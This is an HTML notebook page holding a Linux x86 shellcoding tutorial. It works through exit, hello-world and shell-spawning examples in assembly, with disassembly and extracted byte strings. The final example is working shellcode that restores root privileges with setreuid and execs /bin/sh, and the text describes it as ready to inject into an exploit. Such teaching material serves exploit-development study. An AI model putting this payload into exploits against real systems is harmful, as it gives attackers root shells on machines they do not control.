<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Linux</h1><br/><h2>Linux Shellcoding</h2><br />  When testing shellcode, it is nice to just plop it into a program and let it run. The C program below will be used to test all of our code.   <br /><em><code>/*shellcodetest.c*/</code></em><code> char code[] = "bytecode will go here!";<br />int main(int argc, char **argv)<br />{<br />  int (*func)();<br />  func = (int (*)()) code;<br />  (int)(*func)();<br />}</code><br /> <br /><h3>Example 1 - Making a Quick Exit</h3><br />    The easiest way to begin would be to demonstrate the exit syscall due to it's simplicity. Here is some simple asm code to call exit. Notice the al and XOR trick to ensure that no NULL bytes will get into our code. <br />;<em>exit.asm</em><br />[SECTION .text]<br />global _start<br />_start:<br />        xor eax, eax       ;exit is syscall 1<br />        mov al, 1       ;exit is syscall 1<br />        xor ebx,ebx     ;zero out ebx<br />        int 0x80<br /><br /><br />Take the following steps to compile and extract the byte code.<br />steve hanna@1337b0x:~$ <strong>nasm -f elf exit.asm</strong><br />steve hanna@1337b0x:~$ <strong>ld -o exiter exit.o</strong><br />steve hanna@1337b0x:~$ <strong>objdump -d exiter</strong><br /><br />exiter:     file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br /> 8048080:       <strong>b0 01</strong>                   mov    $0x1,%al<br /> 8048082:       <strong>31 db</strong>                   xor    %ebx,%ebx<br /> 8048084:       <strong>cd 80</strong>                   int    $0x80<br />The bytes we need are <strong>b0 01 31 db cd 80</strong>. Replace the code at the top with:<strong><br />char code[] = "\xb0\x01\x31\xdb\xcd\x80";</strong>    <br />Now, run the program. We have a successful piece of  shellcode! One can strace the program to ensure that it is calling exit.    <br /><br /><h3>Example 2 - Saying Hello</h3><br /> For this next piece, let's ease our way into something useful. In this block of code one will find an example on how to load the address of a string in a piece of our code at runtime. This is important because while running shellcode in an unknown environment, the address of the string will be unknown because the program is not running in its normal address space. <br />;<em>hello.asm</em><br />[SECTION .text]<br /><br />global _start<br /><br /><br />_start:<br /><br />        jmp short ender<br /><br />        starter:<br /><br />        xor eax, eax    ;clean up the registers<br />        xor ebx, ebx<br />        xor edx, edx<br />        xor ecx, ecx<br /><br />        mov al, 4       ;syscall write<br />        mov bl, 1       ;stdout is 1<br />        pop ecx         ;get the address of the string from the stack<br />        mov dl, 5       ;length of the string<br />        int 0x80<br /><br />        xor eax, eax<br />        mov al, 1       ;exit the shellcode<br />        xor ebx,ebx<br />        int 0x80<br /><br />        ender:<br />        call starter	;put the address of the string on the stack<br />        db 'hello'<br /><br /><br /> steve hanna@1337b0x:~$ <strong>nasm -f elf hello.asm</strong><br />steve hanna@1337b0x:~$ <strong>ld -o hello hello.o</strong><br />steve hanna@1337b0x:~$ <strong>objdump -d hello</strong><br /><br />hello:     file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br /> 8048080:       <strong>eb 19</strong>                   jmp    804809b <br /><br />08048082 &lt;starter&gt;:<br /> 8048082:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048084:       <strong>31 db</strong>                   xor    %ebx,%ebx<br /> 8048086:       <strong>31 d2</strong>                   xor    %edx,%edx<br /> 8048088:       <strong>31 c9</strong>                   xor    %ecx,%ecx<br /> 804808a:       <strong>b0 04</strong>                   mov    $0x4,%al<br /> 804808c:       <strong>b3 01</strong>                   mov    $0x1,%bl<br /> 804808e:       <strong>59</strong>                      pop    %ecx<br /> 804808f:       <strong>b2 05</strong>                   mov    $0x5,%dl<br /> 8048091:       <strong>cd 80</strong>                   int    $0x80<br /> 8048093:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048095:       <strong>b0 01</strong>                   mov    $0x1,%al<br /> 8048097:       <strong>31 db</strong>                   xor    %ebx,%ebx<br /> 8048099:       <strong>cd 80</strong>                   int    $0x80<br /><br />0804809b &lt;ender&gt;:<br /> 804809b:       <strong>e8 e2 ff ff ff</strong>          call   8048082 <br /> 80480a0:       <strong>68 65 6c 6c 6f</strong>          push   $0x6f6c6c65<br /><br /><br />Replace the code at the top with:<br /><strong>char code[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\<br />              "\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";<br /></strong>At this point we have a fully functional piece of shellcode that outputs to stdout.<br />Now that dynamic string addressing has been demonstrated as well as the ability to zero<br />out registers, we can move on to a piece of code that gets us a shell.<br /><br /><br /><br /><h3>Example 3 - Spawning a Shell</h3><br />     This code combines what we have been doing so far. This code attempts to set root privileges if they are dropped and then spawns a shell. Note: system("/bin/sh") would have been a lot simpler right? Well the only problem with that approach is the fact that system always drops privileges. <br /><br />Remember when reading this code: <br /><em><strong>    execve </strong></em><em>(</em><em><strong>const char</strong></em><em> *filename, </em><em><strong>const char</strong></em><em>** argv, </em><em><strong>const char</strong></em><em>** envp);</em><br /> <br />So, the second two argument expect pointers to pointers. That's why I  load the address of the "/bin/sh" into the string memory and then pass the address of the string memory to the function. When the pointers  are dereferenced the target memory will be the "/bin/sh" string. <br /><em>;shellex.asm</em><br />[SECTION .text]<br /><br />global _start<br /><br /><br />_start:<br />        xor eax, eax<br />        mov al, 70              ;setreuid is syscall 70<br />        xor ebx, ebx<br />        xor ecx, ecx<br />        int 0x80<br /><br />        jmp short ender<br /><br />        starter:<br /><br />        pop ebx                 ;get the address of the string<br />        xor eax, eax<br /><br />        mov [ebx+7 ], al        ;put a NULL where the N is in the string<br />        mov [ebx+8 ], ebx       ;put the address of the string to where the<br />                                ;AAAA is<br />        mov [ebx+12], eax       ;put 4 null bytes into where the BBBB is<br />        mov al, 11              ;execve is syscall 11<br />        lea ecx, [ebx+8]        ;load the address of where the AAAA was<br />        lea edx, [ebx+12]       ;load the address of the NULLS<br />        int 0x80                ;call the kernel, WE HAVE A SHELL!<br /><br />        ender:<br />        call starter<br />        db '/bin/shNAAAABBBB'<br /><br /><br />steve hanna@1337b0x:~$ <strong>nasm -f elf shellex.asm</strong><br />steve hanna@1337b0x:~$ <strong>ld -o shellex shellex.o</strong><br />steve hanna@1337b0x:~$ <strong>objdump -d shellex</strong><br /><br />shellex:     file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br /> 8048080:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 8048082:       <strong>b0 46</strong>                   mov    $0x46,%al<br /> 8048084:       <strong>31 db</strong>                   xor    %ebx,%ebx<br /> 8048086:       <strong>31 c9</strong>                   xor    %ecx,%ecx<br /> 8048088:       <strong>cd 80</strong>                   int    $0x80<br /> 804808a:       <strong>eb 16</strong>                   jmp    80480a2 <br /><br />0804808c :<br /> 804808c:       <strong>5b</strong>                      pop    %ebx<br /> 804808d:       <strong>31 c0</strong>                   xor    %eax,%eax<br /> 804808f:       <strong>88 43 07</strong>                mov    %al,0x7(%ebx)<br /> 8048092:       <strong>89 5b 08</strong>                mov    %ebx,0x8(%ebx)<br /> 8048095:       <strong>89 43 0c</strong>                mov    %eax,0xc(%ebx)<br /> 8048098:       <strong>b0 0b</strong>                   mov    $0xb,%al<br /> 804809a:       <strong>8d 4b 08</strong>                lea    0x8(%ebx),%ecx<br /> 804809d:       <strong>8d 53 0c</strong>                lea    0xc(%ebx),%edx<br /> 80480a0:       <strong>cd 80</strong>                   int    $0x80<br /><br />080480a2 :<br /> 80480a2:       <strong>e8 e5 ff ff ff</strong>          call   804808c <br /> 80480a7:       <strong>2f</strong>                      das<br /> 80480a8:       <strong>62 69 6e</strong>                bound  %ebp,0x6e(%ecx)<br /> 80480ab:       <strong>2f</strong>                      das<br /> 80480ac:       <strong>73 68</strong>                   jae    8048116 <br /> 80480ae:       <strong>58</strong>                      pop    %eax<br /> 80480af:       <strong>41</strong>                      inc    %ecx<br /> 80480b0:       <strong>41</strong>                      inc    %ecx<br /> 80480b1:       <strong>41</strong>                      inc    %ecx<br /> 80480b2:       <strong>41</strong>                      inc    %ecx<br /> 80480b3:       <strong>42</strong>                      inc    %edx<br /> 80480b4:       <strong>42</strong>                      inc    %edx<br /> 80480b5:       <strong>42</strong>                      inc    %edx<br /> 80480b6:       <strong>42</strong>                      inc    %edx<br />Replace the code at the top with:<br /><br /><strong>char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\<br />	      "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"\<br />	      "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\<br />	      "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"\<br />	      "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";</strong>This code produces a fully functional shell when injected into an exploit<br />and demonstrates most of the skills needed to write successful shellcode. Be<br />aware though, the better one is at assembly, the more functional, robust,<br />and most of all evil, one's code will be.</div></body></html>